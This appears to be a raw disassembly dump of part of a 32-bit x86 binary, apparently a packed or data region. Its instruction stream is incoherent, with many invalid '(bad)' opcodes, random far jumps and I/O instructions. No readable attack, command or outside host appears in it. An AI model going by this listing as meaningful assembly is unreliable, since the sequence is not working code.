  41e708:	add    eax,0x83000001
  41e70d:	jmp    0x8c7909fa
  41e712:	fst    st(2)
  41e714:	test   eax,0x9a9cc7fa
  41e719:	enter  0x4ccc,0xb3
  41e71d:	(bad)  
  41e71e:	mov    dl,0xa6
  41e720:	push   ss
  41e721:	retf   
  41e722:	jne    0x41e70d
  41e724:	xor    esi,DWORD PTR [edx+0xb]
  41e727:	push   0xcdd7cf0e
  41e72c:	jne    0x41e748
  41e72e:	add    BYTE PTR [edx-0x59700d89],ah
  41e734:	fcomp  st(4)
  41e736:	lock pop si
  41e739:	retf   0x64ea
  41e73c:	(bad)  
  41e73d:	shl    DWORD PTR [ecx],1
  41e73f:	and    ecx,DWORD PTR ds:0xd8120675
  41e745:	add    BYTE PTR [ebx],al
  41e747:	mov    edi,0x692f74fd
  41e74c:	sub    al,0xc9
  41e74e:	mov    esp,DWORD PTR [ecx]
  41e750:	imul   esp,DWORD PTR [edx+0x39141eae],0xffffffc5
  41e757:	sub    DWORD PTR [edx+0x569ac15b],edx
  41e75d:	es mov cl,0xdc
  41e760:	pop    eax
  41e761:	(bad)  [ecx+0x57]
  41e764:	(bad)  
  41e765:	leave  
  41e766:	call   FWORD PTR [esi+0x6b]
  41e769:	xor    eax,0x4b28cdc1
  41e76e:	scas   eax,DWORD PTR es:[edi]
  41e76f:	mov    edx,0xa0df75b
  41e774:	aad    0x5e
  41e776:	ror    BYTE PTR ds:0xcda25852,1
  41e77c:	jecxz  0x41e7ef
  41e77e:	dec    edi
  41e77f:	in     eax,0xa4
  41e781:	(bad)  
  41e782:	test   al,0x73
  41e784:	mov    dl,0x8c
  41e786:	stos   BYTE PTR es:[edi],al
  41e787:	fisub  DWORD PTR cs:[ebx+0x67]
  41e78b:	ret    0x2f0d
  41e78e:	pop    ebp
  41e78f:	cwde   
  41e790:	adc    bl,ch
  41e792:	mov    eax,0x7087e57a
  41e797:	popa   
  41e798:	push   esp
  41e799:	not    DWORD PTR [eax+eiz*4+0x4d2be0c9]
  41e7a0:	lahf   
  41e7a1:	mov    ecx,0x4c9a4e04
  41e7a6:	repnz rcl BYTE PTR [ebp-0x4e],cl
  41e7aa:	mov    esi,0xa6e2b31d
  41e7af:	dec    ebx
  41e7b0:	dec    ebx
  41e7b1:	fsubr  DWORD PTR [esi+eiz*1]
  41e7b4:	hlt    
  41e7b5:	call   0x8e66:0xb03a3ad
  41e7bc:	outs   dx,BYTE PTR ds:[esi]
  41e7bd:	mov    ch,0x4d
  41e7bf:	jmp    0xa5a519a8
  41e7c4:	fnstenv [eax-0x34]
  41e7c7:	mov    edx,0x78aa289d
  41e7cc:	push   0x50
  41e7ce:	cs inc esi
  41e7d0:	adc    eax,0x68d777e1
  41e7d5:	push   ds
  41e7d6:	jp     0x41e7e8
  41e7d8:	xchg   esp,eax
  41e7d9:	dec    edi
  41e7da:	xor    al,0xd3
  41e7dc:	scas   al,BYTE PTR es:[edi]
  41e7dd:	arpl   bp,ax
  41e7df:	adc    ecx,esi
  41e7e1:	aad    0xbe
  41e7e3:	fldcw  WORD PTR [ebx-0x47]
  41e7e6:	sahf   
  41e7e7:	push   ss
  41e7e8:	jecxz  0x41e7ec
  41e7ea:	test   eax,0x2c83cccd
  41e7ef:	test   eax,0x1e49efe7
  41e7f4:	xchg   edx,eax
  41e7f5:	ror    BYTE PTR [edi+0x6d],1
  41e7f8:	ror    bh,1
  41e7fa:	add    al,0x7c
  41e7fc:	dec    ebp
  41e7fe:	adc    DWORD PTR [eax+0x13ddbc5f],ebx
  41e804:	jb     0x41e823
  41e806:	and    BYTE PTR [edx+eax*8],bl
  41e809:	mov    ebx,edx
  41e80b:	test   bl,0x8
  41e80e:	xchg   DWORD PTR [ecx+0xe9],esp
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8a6
  41e881:	outs   dx,DWORD PTR ds:[esi]
  41e882:	sbb    BYTE PTR [edi+0x14511],bh
  41e888:	add    eax,0xe3000001
  41e88d:	pop    es
  41e88e:	adc    al,0x97
  41e890:	and    DWORD PTR [esi-0x3],edx
  41e893:	jns    0x41e909
  41e895:	push   0xc894c8a9
  41e89a:	mov    cl,BYTE PTR [eax+0x50]
  41e89d:	push   ecx
  41e89e:	mov    cl,BYTE PTR [ecx]
  41e8a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8a1:	fs daa 
  41e8a3:	pop    ss
  41e8a4:	ret    
  41e8a5:	mov    al,ds:0x3daacb34
  41e8aa:	pop    ds
  41e8ab:	pop    ss
  41e8ac:	xchg   ecx,eax
  41e8ad:	mov    ebp,0xe34a7295
  41e8b2:	inc    ebx
  41e8b3:	ds nop
  41e8b5:	adc    eax,0xe84c9976
  41e8ba:	xor    al,BYTE PTR [edx-0x48c5c85e]
  41e8c0:	xlat   BYTE PTR ds:[ebx]
  41e8c1:	or     dl,BYTE PTR [edi+0x1]
  41e8c4:	xchg   edi,eax
  41e8c5:	push   ebx
  41e8c6:	neg    BYTE PTR [edx+0x47]
  41e8c9:	add    al,0x51
  41e8cb:	jp     0x41e8eb
  41e8cd:	add    al,0x44
  41e8cf:	inc    ecx
  41e8d0:	cli    
  41e8d1:	mov    al,0x82
  41e8d3:	inc    ebp
  41e8d4:	addr16 pop ebp
  41e8d6:	mov    al,0x6
  41e8d8:	pusha  
  41e8d9:	push   ebx
  41e8da:	push   cs
  41e8db:	mov    DWORD PTR [ebx],esp
  41e8dd:	push   ss
  41e8de:	xchg   esi,eax
  41e8df:	cli    
  41e8e0:	(bad)  
  41e8e1:	fnsave [eax]
  41e8e3:	xor    BYTE PTR [edx],al
  41e8e5:	inc    edi
  41e8e6:	mov    ch,0x39
  41e8e8:	sub    eax,0x3cb0fe37
  41e8ed:	jb     0x41e8d0
  41e8ef:	sbb    ebp,edx
  41e8f1:	jae    0x41e90d
  41e8f3:	sub    al,0x4b
  41e8f5:	call   0xe87a:0xf8ad3181
  41e8fc:	xchg   esi,eax
  41e8fd:	push   esp
  41e8fe:	jbe    0x41e8f4
  41e900:	lea    ebp,[edi+ebx*8+0x70]
  41e904:	into   
  41e905:	jno    0x41e908
  41e907:	pop    es
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	loopne 0x41e8c9
  41e90b:	xor    ecx,DWORD PTR [edx]
  41e90d:	ret    0x29f4
  41e910:	sbb    bh,dh
  41e912:	xchg   BYTE PTR [eax-0x5f],bl
  41e915:	int    0x43
  41e917:	std    
  41e918:	js     0x41e91a
  41e91a:	add    al,0x9
  41e91c:	lock pop esi
  41e91e:	xor    dh,BYTE PTR [edi-0xe]
  41e921:	retf   
  41e922:	jbe    0x41e93b
  41e924:	xchg   ebx,eax
  41e925:	(bad)  
  41e926:	push   cs
  41e927:	push   0x9fb8ecbd
  41e92c:	mov    edi,0x33a07eb
  41e931:	add    esp,DWORD PTR ds:0x22b6fdbe
  41e937:	pop    ebp
  41e938:	iret   
  41e939:	and    esi,ecx
  41e93b:	inc    edx
  41e93c:	dec    ebx
  41e93d:	mov    ch,0x56
  41e93f:	loope  0x41e8db
  41e941:	(bad)  
  41e942:	std    
  41e943:	mov    edi,0x9a93bb2f
  41e948:	outs   dx,DWORD PTR ds:[esi]
  41e949:	mov    edi,0x698d4e57
  41e94e:	sub    esi,eax
  41e950:	sbb    al,0x40
  41e952:	jns    0x41e972
  41e954:	test   ebp,esi
  41e956:	imul   esi,DWORD PTR [ebx-0x29],0xcce0bb80
  41e95d:	mov    al,ds:0xd00579fa
  41e962:	jb     0x41e9b6
  41e964:	push   ebx
  41e965:	xchg   BYTE PTR [edi],dl
  41e967:	call   0x646c:0xea0126df
  41e96e:	push   edx
  41e96f:	mov    dh,0xc8
  41e971:	and    BYTE PTR [eax-0x12d2bbf7],ah
  41e977:	mov    ah,0x37
  41e979:	and    eax,0xc8e90bc8
  41e97e:	xchg   DWORD PTR [eax-0x64e5a920],ecx
  41e984:	imul   esp,esp,0x9898647
  41e98a:	outs   dx,BYTE PTR ds:[esi]
  41e98b:	jmp    0x41e9bd
  41e98d:	je     0x41e913
  41e98f:	pop    eax
  41e990:	sub    DWORD PTR [eax],eax
	...
  41e9f2:	add    BYTE PTR [eax],al
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	or     eax,0x165c179b
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0xe000001
  41ea0d:	into   
  41ea0e:	mov    bl,0x35
  41ea10:	arpl   WORD PTR [ecx-0x15],bp
  41ea13:	mov    bl,0xcb
  41ea15:	rcl    DWORD PTR [ebx],cl
  41ea17:	xor    ch,BYTE PTR [ebp+0x56f62285]
  41ea1d:	dec    edx
  41ea1e:	mov    edx,0x6f8703f5
  41ea23:	add    BYTE PTR [ebx+0x7761b632],bh
  41ea29:	inc    edx
  41ea2a:	addr16 xor al,0xa3
  41ea2d:	xchg   esp,eax
  41ea2e:	in     al,0x25
  41ea30:	rcl    BYTE PTR [eax],cl
  41ea32:	jno    0x41ea14
  41ea34:	inc    esi
  41ea35:	ror    DWORD PTR [edi+0x67e0cde6],cl
  41ea3b:	pop    edx
  41ea3c:	mov    ebp,0x4ce272da
  41ea41:	push   esp
  41ea42:	das    
  41ea43:	retf   
  41ea44:	sbb    eax,0x532d243e
  41ea49:	push   ds
  41ea4a:	xor    edx,DWORD PTR [ebp+0x59]
  41ea4d:	xchg   esp,eax
  41ea4e:	bt     DWORD PTR [ebx+0x6706425f],esp
  41ea55:	jmp    0xe465f157
  41ea5a:	retf   
  41ea5b:	or     eax,0xdb692b4a
  41ea60:	sbb    ah,BYTE PTR [esi]
  41ea62:	out    0x9,eax
  41ea64:	pop    edi
  41ea65:	daa    
  41ea66:	mov    esp,ds
  41ea68:	mov    al,0x9f
  41ea6a:	xor    al,0x47
  41ea6c:	inc    ebp
  41ea6d:	mov    BYTE PTR [edx+ebx*1+0x3cb760e],cl
  41ea74:	mov    edx,0x28a7cc22
  41ea79:	hlt    
  41ea7a:	xchg   ebx,eax
  41ea7b:	jg     0x41ea5e
  41ea7d:	retf   0xa85c
  41ea80:	mov    WORD PTR [esi],gs
  41ea82:	jb     0x41eaf9
  41ea84:	mov    esi,0x8282a365
  41ea89:	test   BYTE PTR gs:[ebp-0x4a088fc0],dh
  41ea90:	sar    DWORD PTR [edi+0xc],1
  41ea93:	outs   dx,BYTE PTR ds:[esi]
  41ea94:	jge    0x41ea83
  41ea96:	sub    ah,BYTE PTR [ebx]
  41ea98:	iret   
  41ea99:	cld    
  41ea9a:	test   al,0x3e
  41ea9c:	lea    esi,[ebx]
  41ea9e:	mov    ebx,0x1cb9b52e
  41eaa3:	pop    edx
  41eaa4:	push   es
  41eaa5:	cwde   
  41eaa6:	fnstenv [ecx]
  41eaa8:	test   eax,0xbdd150ac
  41eaad:	add    cl,ah
  41eaaf:	cmp    al,0x8b
  41eab1:	ins    DWORD PTR es:[edi],dx
  41eab2:	sti    
  41eab3:	xor    al,0x9f
  41eab5:	fmul   QWORD PTR [ecx+0x281360ee]
  41eabb:	mov    BYTE PTR [edi+0x27693471],dl
  41eac1:	pop    eax
  41eac2:	jg     0x41eaba
  41eac4:	cmp    ah,BYTE PTR [ecx]
  41eac6:	sub    DWORD PTR [esi+0x602cc7d],edi
  41eacc:	or     cl,BYTE PTR [esp+ecx*1+0x78]
  41ead0:	mov    dl,0x47
  41ead2:	mov    eax,0xffbdaa53
  41ead7:	sar    BYTE PTR [edx+esi*1-0x35543ead],0xe2
  41eadf:	sbb    ch,BYTE PTR [esi+0x14]
  41eae2:	dec    esp
  41eae3:	dec    ebx
  41eae4:	jmp    0x41eadb
  41eae6:	sti    
  41eae7:	adc    BYTE PTR [eax+esi*1+0x69],0x5
  41eaec:	jmp    0x41ea70
  41eaee:	inc    edi
  41eaef:	out    dx,eax
  41eaf0:	pusha  
  41eaf1:	not    BYTE PTR [eax+0x6fb7c139]
  41eaf7:	pop    esi
  41eaf8:	dec    ebp
  41eaf9:	mov    edi,0xf1eb8d59
  41eafe:	bound  edi,QWORD PTR [edi]
  41eb00:	arpl   sp,bx
  41eb02:	jae    0x41eb11
  41eb04:	pop    esp
  41eb05:	(bad)  
  41eb06:	cmp    ch,BYTE PTR [ecx-0x44]
  41eb09:	or     ah,BYTE PTR [eax-0x78150c71]
  41eb0f:	xor    al,0x11
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x6
  41eb81:	dec    esi
  41eb82:	clc    
  41eb83:	rcr    BYTE PTR [ebx],cl
  41eb85:	inc    edi
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0x42000001
  41eb8d:	dec    ebp
  41eb8e:	jmp    0x41ebe1
  41eb90:	mov    ds:0x4f70d182,eax
  41eb95:	push   eax
  41eb96:	mov    ecx,DWORD PTR [eax]
  41eb98:	push   0x858c3138
  41eb9d:	mov    bh,BYTE PTR [esp+edx*4+0xd5cc7af]
  41eba4:	sbb    al,0xa0
  41eba6:	mov    ch,0x20
  41eba8:	push   eax
  41eba9:	fsub   st,st(5)
  41ebab:	adc    eax,0x7d796f0f
  41ebb0:	or     eax,0x9111e5a9
  41ebb5:	test   eax,0x68797255
  41ebba:	or     eax,0x8bc77d08
  41ebbf:	push   cs
  41ebc0:	mov    DWORD PTR [ebx],eax
  41ebc2:	aad    0x20
  41ebc4:	in     al,dx
  41ebc5:	push   ss
  41ebc6:	lahf   
  41ebc7:	push   eax
  41ebc8:	aas    
  41ebc9:	or     DWORD PTR [edi+0x6f],eax
  41ebcc:	mov    cl,0xd6
  41ebce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebcf:	jb     0x41ebb6
  41ebd1:	mov    ah,0x6d
  41ebd3:	mov    edx,0xc1b0e8bd
  41ebd8:	jp     0x41ec34
  41ebda:	or     ch,bh
  41ebdc:	and    DWORD PTR [eax-0xbb9c9c4],ebp
  41ebe2:	sub    bh,BYTE PTR ds:0x990be059
  41ebe8:	into   
  41ebe9:	sar    edx,1
  41ebeb:	pop    ebp
  41ebec:	cmp    eax,0xb85f2696
  41ebf1:	scas   al,BYTE PTR es:[edi]
  41ebf2:	imul   edi,DWORD PTR [eax-0x65af8e38],0x52
  41ebf9:	js     0x41ec75
  41ebfb:	sub    BYTE PTR [esp+ecx*2+0x63],ch
  41ebff:	daa    
  41ec00:	in     al,dx
  41ec01:	outs   dx,BYTE PTR ds:[esi]
  41ec02:	imul   eax,DWORD PTR [ecx],0xa7136e53
  41ec08:	mov    dl,0xc9
  41ec0a:	sub    dl,bh
  41ec0c:	jne    0x41ebab
  41ec0e:	xor    DWORD PTR [ebx+eiz*8+0x4e],eax
  41ec12:	stos   DWORD PTR es:[edi],eax
  41ec13:	jmp    0x4552b672
  41ec18:	inc    edi
  41ec19:	jne    0x41ec7f
  41ec1b:	jle    0x41ec29
  41ec1d:	push   eax
  41ec1e:	sar    DWORD PTR [ecx-0x16],cl
  41ec21:	das    
  41ec22:	push   0x3c491b17
  41ec27:	in     al,dx
  41ec28:	xor    eax,0xea7e2d1c
  41ec2d:	mov    ds:0xccebcb5a,al
  41ec32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec33:	and    al,0xf3
  41ec35:	pusha  
  41ec36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec37:	inc    esp
  41ec38:	xchg   esi,eax
  41ec39:	icebp  
  41ec3a:	xchg   edx,eax
  41ec3b:	xor    eax,0x430c3070
  41ec40:	sbb    al,0x4a
  41ec42:	mov    ds:0x699df619,al
  41ec47:	(bad)  
  41ec48:	and    al,0x16
  41ec4a:	mov    ebx,0x46ad8d3
  41ec4f:	jne    0x41ec26
  41ec51:	pop    edx
  41ec52:	pushf  
  41ec53:	das    
  41ec54:	cmp    al,0x68
  41ec56:	sbb    dh,ch
  41ec58:	out    0xd4,eax
  41ec5a:	sub    eax,0x8adf973b
  41ec5f:	cmp    BYTE PTR [esp+eax*4-0xc77ef5c],al
  41ec66:	sar    DWORD PTR [ebp-0x1f62b625],cl
  41ec6c:	cmp    BYTE PTR [eax+0x4f6bdb54],ch
  41ec72:	xor    eax,ecx
  41ec74:	xchg   esp,eax
  41ec75:	xor    al,0x73
  41ec77:	xchg   ecx,eax
  41ec78:	cld    
  41ec79:	jno    0x41ecdc
  41ec7b:	ret    
  41ec7c:	jmp    DWORD PTR [ebx-0x1fa64027]
  41ec82:	xor    BYTE PTR [ebp-0x63bb6944],al
  41ec88:	sbb    cl,BYTE PTR [ecx]
  41ec8a:	loopne 0x41ecac
  41ec8c:	lds    ecx,FWORD PTR [ebp-0x71]
  41ec8f:	call   0x41ecfa
	...
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x57305fd0
  41ed02:	jl     0x41ec8a
  41ed04:	and    BYTE PTR [eax+0x1],cl
  41ed07:	add    BYTE PTR ds:0xff000001,al
  41ed0d:	cmp    esi,DWORD PTR [ebx+eax*2]
  41ed10:	aaa    
  41ed11:	inc    eax
  41ed12:	repnz or edx,edi
  41ed15:	fsubr  DWORD PTR [eax+0x6eebf938]
  41ed1b:	mov    esp,0x14a9a7da
  41ed20:	jg     0x41eda1
  41ed22:	push   esp
  41ed23:	lods   eax,DWORD PTR ds:[esi]
  41ed24:	ins    DWORD PTR es:[edi],dx
  41ed25:	loop   0x41eda5
  41ed27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed28:	in     al,dx
  41ed29:	ficom  DWORD PTR [eax-0xb20fac]
  41ed2f:	fmul   DWORD PTR [ebx]
  41ed31:	or     ebp,DWORD PTR [edx-0x2495ebb5]
  41ed37:	cwde   
  41ed38:	dec    ecx
  41ed39:	jae    0x41ed19
  41ed3b:	sbb    ah,ah
  41ed3d:	cmp    al,0xb3
  41ed3f:	repnz push esi
  41ed41:	adc    ch,cl
  41ed43:	pop    edx
  41ed44:	fwait
  41ed45:	scas   al,BYTE PTR es:[edi]
  41ed46:	aas    
  41ed47:	push   ecx
  41ed48:	stc    
  41ed49:	mov    esi,0x77ec7e71
  41ed4e:	mov    bh,0x65
  41ed50:	out    0x19,eax
  41ed52:	or     al,0xa5
  41ed54:	push   edx
  41ed55:	in     eax,0x53
  41ed57:	xchg   ebp,eax
  41ed58:	jno    0x41ed44
  41ed5a:	ja     0x41ed11
  41ed5c:	add    DWORD PTR [eax-0x32],edx
  41ed5f:	ficom  WORD PTR [edx+eiz*4-0x4af6e39e]
  41ed66:	push   0xb000aec9
  41ed6b:	jnp    0x41eda3
  41ed6d:	jmp    0x63fd:0xb52cc931
  41ed74:	xchg   ebp,eax
  41ed75:	add    DWORD PTR [ecx],esp
  41ed77:	in     eax,0xd7
  41ed79:	pop    eax
  41ed7a:	mov    ch,0x1d
  41ed7c:	in     al,dx
  41ed7d:	and    DWORD PTR [esi+0x1],ebp
  41ed80:	cmp    al,0x97
  41ed82:	int    0xc5
  41ed84:	mov    ecx,0xe4efa84a
  41ed89:	lods   eax,DWORD PTR ds:[esi]
  41ed8a:	into   
  41ed8b:	mov    edi,0x31c0b42e
  41ed90:	int    0xaa
  41ed92:	jae    0x41ed16
  41ed94:	scas   eax,DWORD PTR es:[edi]
  41ed95:	push   cs
  41ed96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed97:	sahf   
  41ed98:	cwde   
  41ed99:	int    0xa3
  41ed9b:	fnstsw WORD PTR [ebx-0x7e54c48]
  41eda1:	fcomp  DWORD PTR [eax-0x2f]
  41eda4:	dec    esp
  41eda5:	sbb    DWORD PTR [esi+0x1df13681],ecx
  41edab:	scas   eax,DWORD PTR es:[edi]
  41edac:	fucomi st,st(7)
  41edae:	and    DWORD PTR [eax-0x80],eax
  41edb1:	push   eax
  41edb2:	scas   eax,DWORD PTR es:[edi]
  41edb3:	mov    al,0xb9
  41edb5:	xchg   edi,eax
  41edb6:	xchg   edx,eax
  41edb7:	mov    ebp,0x71ee7668
  41edbc:	push   ebx
  41edbd:	js     0x41edfd
  41edbf:	nop
  41edc0:	in     al,dx
  41edc1:	ret    
  41edc2:	jo     0x41ee25
  41edc4:	jg     0x41edc3
  41edc6:	jp     0x41edfc
  41edc8:	stos   DWORD PTR es:[edi],eax
  41edc9:	or     esp,DWORD PTR [ebp-0x29ff600]
  41edcf:	or     BYTE PTR [edx+0x248936a7],ch
  41edd5:	push   es
  41edd6:	mov    al,0xd6
  41edd8:	xor    al,0xd8
  41edda:	into   
  41eddb:	xor    al,BYTE PTR [ebp+0x6580a2e6]
  41ede1:	mov    edx,0x334d55c5
  41ede6:	stc    
  41ede7:	push   edx
  41ede8:	mov    bh,0x1a
  41edea:	add    esp,DWORD PTR [edx]
  41edec:	cmp    BYTE PTR [esi-0x392df31d],dh
  41edf2:	pop    eax
  41edf3:	add    DWORD PTR [ebx-0xd1b1ad9],edi
  41edf9:	imul   eax,edi,0xfffffffa
  41edfc:	push   cs
  41edfd:	inc    BYTE PTR [eax+edi*2-0x35]
  41ee01:	push   ebp
  41ee02:	add    eax,0x4eddb9c9
  41ee07:	fsub   QWORD PTR [edx-0xd3d2662]
  41ee0d:	mov    bl,0x2e
  41ee0f:	mov    bl,BYTE PTR [edx]
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x2554:0x825e3fe7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x2b000001
  41ee8d:	popf   
  41ee8e:	or     bl,BYTE PTR [ebx+ecx*4+0x251f9881]
  41ee95:	or     cl,BYTE PTR [edi-0x4b64007]
  41ee9b:	sar    DWORD PTR [eax+0x41],1
  41ee9e:	mov    ch,0x3
  41eea0:	cmp    al,0x44
  41eea2:	dec    edx
  41eea3:	adc    eax,0xc7363abd
  41eea8:	jge    0x41ee2b
  41eeaa:	ret    
  41eeab:	jno    0x41eee6
  41eead:	sti    
  41eeae:	inc    esi
  41eeaf:	in     al,dx
  41eeb0:	add    ecx,DWORD PTR [ebx-0x35]
  41eeb3:	mov    ds:0xbe8cb692,al
  41eeb8:	fldcw  WORD PTR [esi+esi*4-0x6f]
  41eebc:	cmp    esi,DWORD PTR [ecx]
  41eebe:	dec    edi
  41eebf:	sbb    al,0xbe
  41eec1:	cmp    BYTE PTR [eax-0x7cb94352],0xf2
  41eec8:	leave  
  41eec9:	js     0x41ee79
  41eecb:	xchg   esp,eax
  41eecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eecd:	jns    0x41ee9e
  41eecf:	icebp  
  41eed0:	mov    al,ds:0x20077e28
  41eed5:	jae    0x41ee63
  41eed7:	test   ebx,eax
  41eed9:	mov    WORD PTR [edi+0x47],cs
  41eedc:	xchg   DWORD PTR [eax-0x53e1976e],edi
  41eee2:	test   eax,0x7eea7313
  41eee7:	call   FWORD PTR [eax-0x734dd884]
  41eeed:	cmp    dh,BYTE PTR [eax+ebp*1+0x52]
  41eef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eef2:	dec    edi
  41eef3:	pop    ds
  41eef4:	sbb    al,0x71
  41eef6:	push   eax
  41eef7:	mov    DWORD PTR [ebx+0x2a],ebp
  41eefa:	cdq    
  41eefb:	adc    DWORD PTR [ebx+eiz*8-0x62356cee],0x4c
  41ef03:	out    0xe5,al
  41ef05:	rcl    edx,1
  41ef07:	outs   dx,BYTE PTR ds:[esi]
  41ef08:	es in  al,dx
  41ef0a:	push   eax
  41ef0b:	cdq    
  41ef0c:	repnz push esp
  41ef0e:	jecxz  0x41ef29
  41ef10:	retf   
  41ef11:	loope  0x41ef25
  41ef13:	add    eax,0xa73ad7c
  41ef18:	loope  0x41ef51
  41ef1a:	cmc    
  41ef1b:	jmp    0x3064:0x8a1db63b
  41ef22:	sbb    eax,0xc319463e
  41ef27:	mov    dh,0x70
  41ef29:	shr    BYTE PTR [ecx],cl
  41ef2b:	or     BYTE PTR [esi-0x421f7e17],al
  41ef31:	cld    
  41ef32:	jb     0x41eeb8
  41ef34:	and    ecx,DWORD PTR [esi-0x52]
  41ef37:	jg     0x41ef43
  41ef39:	sbb    DWORD PTR [edx-0x5c],ebx
  41ef3c:	mov    cl,0xe2
  41ef3e:	and    eax,0xc2c3c2a3
  41ef43:	inc    ebp
  41ef44:	push   edi
  41ef45:	ins    BYTE PTR es:[edi],dx
  41ef46:	jmp    0xf4214f19
  41ef4b:	jecxz  0x41eee7
  41ef4d:	push   es
  41ef4e:	fcomi  st,st(7)
  41ef50:	mov    al,0xba
  41ef52:	leave  
  41ef53:	addr16 aam 0xf9
  41ef56:	sub    BYTE PTR [esi-0x10],bh
  41ef59:	mov    eax,DWORD PTR ds:0xbf51d60f
  41ef5f:	mul    cl
  41ef61:	pop    ebx
  41ef62:	sbb    BYTE PTR [esi-0x1561ac5e],0x2f
  41ef69:	ss adc bh,dh
  41ef6c:	xor    al,0xf7
  41ef6e:	mov    eax,ds:0x275285bf
  41ef73:	stc    
  41ef74:	mul    esi
  41ef76:	or     eax,0x384c40f4
  41ef7b:	mov    ah,0xb2
  41ef7d:	in     al,0xb9
  41ef7f:	mov    esi,0x902f9b62
  41ef84:	sbb    esi,ebp
  41ef86:	mov    dl,0x98
  41ef88:	jg     0x41ef5e
  41ef8a:	mov    gs,WORD PTR [eax+0x6bf9270f]
  41ef90:	add    al,0x0
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul esi,DWORD PTR [esi],0x8
  41f002:	sbb    ebp,DWORD PTR ds:0x14a2a
  41f008:	add    eax,0xae000001
  41f00d:	pushf  
  41f00e:	call   0x6ace7dd4
  41f013:	aas    
  41f014:	loope  0x41f009
  41f016:	mov    dh,0x76
  41f018:	fsubrp st(5),st
  41f01a:	mov    WORD PTR [ecx],?
  41f01c:	xor    cl,BYTE PTR [ebx]
  41f01e:	ret    
  41f01f:	xlat   BYTE PTR ds:[ebx]
  41f020:	add    al,0x5d
  41f022:	lahf   
  41f023:	ret    0xe6f2
  41f026:	arpl   WORD PTR [ebx-0x30],ax
  41f029:	xchg   esp,eax
  41f02a:	repz fidiv WORD PTR fs:[ecx-0x6dad96d5]
  41f032:	mov    ecx,0x64cd955
  41f037:	imul   ebp,DWORD PTR [eax+0x46],0x4baf3256
  41f03e:	cmp    BYTE PTR [esi+0x39c0d335],0xd7
  41f045:	sbb    bl,dh
  41f047:	scas   al,BYTE PTR es:[edi]
  41f048:	inc    eax
  41f049:	es enter 0x1c92,0x1
  41f04e:	outs   dx,BYTE PTR ds:[esi]
  41f04f:	pop    eax
  41f050:	push   edi
  41f051:	and    dh,ah
  41f053:	lea    edx,[edx-0x64]
  41f056:	mov    dl,0x1b
  41f058:	(bad)  
  41f059:	scas   eax,DWORD PTR es:[edi]
  41f05a:	push   esi
  41f05b:	jp     0x41efe8
  41f05d:	outs   dx,BYTE PTR ds:[esi]
  41f05e:	jno    0x41f07c
  41f060:	(bad)  
  41f061:	sti    
  41f062:	mov    edi,0xc13d820a
  41f067:	add    cl,0x2c
  41f06a:	aas    
  41f06b:	pop    ds
  41f06c:	add    ch,BYTE PTR [edi+0x2336e724]
  41f072:	mov    edx,0x7b0b4b92
  41f077:	icebp  
  41f078:	loopne 0x41f093
  41f07a:	(bad)  
  41f07b:	(bad)  [esp+edx*2]
  41f07e:	jmp    0x41f018
  41f080:	lds    ebx,FWORD PTR [edx]
  41f082:	and    BYTE PTR [eax+0x4e],bl
  41f085:	and    ebx,DWORD PTR [esi-0x4b]
  41f088:	test   ecx,ebp
  41f08a:	mov    ch,0x30
  41f08c:	imul   esp,DWORD PTR [esi],0xc787a963
  41f092:	(bad)  
  41f093:	loop   0x41f01c
  41f095:	jnp    0x41f082
  41f097:	adc    ch,ah
  41f099:	mov    edi,0xb4bec6fd
  41f09e:	aad    0xa6
  41f0a0:	fnsave [edi]
  41f0a2:	mov    al,ds:0xcf2e86bd
  41f0a7:	(bad)  
  41f0a8:	xchg   esi,eax
  41f0a9:	mov    edi,0x45858ab0
  41f0ae:	jnp    0x41f0b4
  41f0b0:	out    0x60,eax
  41f0b2:	ret    0xa221
  41f0b5:	std    
  41f0b6:	add    dh,BYTE PTR [edx+0x14]
  41f0b9:	mov    al,0x21
  41f0bb:	aas    
  41f0bc:	adc    BYTE PTR [eax-0x1d203adf],0x66
  41f0c3:	cmp    edi,DWORD PTR [ebx-0x5]
  41f0c6:	ins    DWORD PTR es:[edi],dx
  41f0c7:	stos   BYTE PTR es:[edi],al
  41f0c8:	pop    ebx
  41f0c9:	mov    dh,0x7d
  41f0cb:	mov    al,ds:0x9f4d552c
  41f0d0:	push   es
  41f0d1:	std    
  41f0d2:	pop    es
  41f0d3:	dec    DWORD PTR [esi]
  41f0d5:	add    DWORD PTR [ebx-0x76],ebp
  41f0d8:	fcmovnu st,st(2)
  41f0da:	lea    ebx,[edi+0x7ba85a69]
  41f0e0:	jno    0x41f0be
